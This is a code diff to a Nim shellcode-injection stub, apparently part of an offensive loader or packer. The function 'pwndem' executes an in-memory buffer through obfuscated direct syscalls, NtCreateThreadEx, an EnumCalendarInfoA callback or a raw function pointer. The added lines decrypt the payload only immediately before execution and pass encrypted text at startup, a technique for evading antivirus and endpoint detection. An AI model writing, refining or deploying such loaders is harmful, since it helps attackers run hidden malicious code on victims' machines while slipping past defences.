@@ -1,5 +1,4 @@
 let LocalInjectStub*  = """
-                
 
 proc pwndem[byte](friendlycode: openarray[byte]): void =
 
@@ -110,6 +109,9 @@ proc pwndem[byte](friendlycode: openarray[byte]): void =
     when defined(LocalCreateThread):
         var tHandle: HANDLE
         when defined(SysWhispers):
+            ptrEncText = cast[ptr byte](buffer)
+            ptrDecText = cast[ptr byte](buffer)
+            decryptLate()
             status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,buffer,NULL, FALSE, 0, 0, 0, NULL)
             NtWaitForSingleObject(tHandle, 0, nil)
             status = zuatzuastdiasyy(tHandle)
@@ -123,6 +125,9 @@ proc pwndem[byte](friendlycode: openarray[byte]): void =
                 else:
                     when defined(verbose):
                         echo obf("[-] Failed to find opcode for NtCreateThreadEx")
+            ptrEncText = cast[ptr byte](buffer)
+            ptrDecText = cast[ptr byte](buffer)
+            decryptLate()
             status = NtCreateThreadEx(
             &tHandle, 
             THREAD_ALL_ACCESS, 
@@ -147,12 +152,19 @@ proc pwndem[byte](friendlycode: openarray[byte]): void =
         status = NtClose(pHandle)
         
     when defined(Callback):
+        ptrEncText = cast[ptr byte](buffer)
+        ptrDecText = cast[ptr byte](buffer)
+        decryptLate()
         discard EnumCalendarInfoA(cast[CALINFO_ENUMPROCA](buffer),1,1,1)
         WaitForSingleObject(-1, -1)
     else:
+        ptrEncText = cast[ptr byte](buffer)
+        ptrDecText = cast[ptr byte](buffer)
+        decryptlate()
+        #decryptLate()
         let f = cast[proc(){.nimcall.}](buffer)
         f()
 
 when isMainModule:
-     pwndem(dectext)
+     pwndem(enctext)
 """
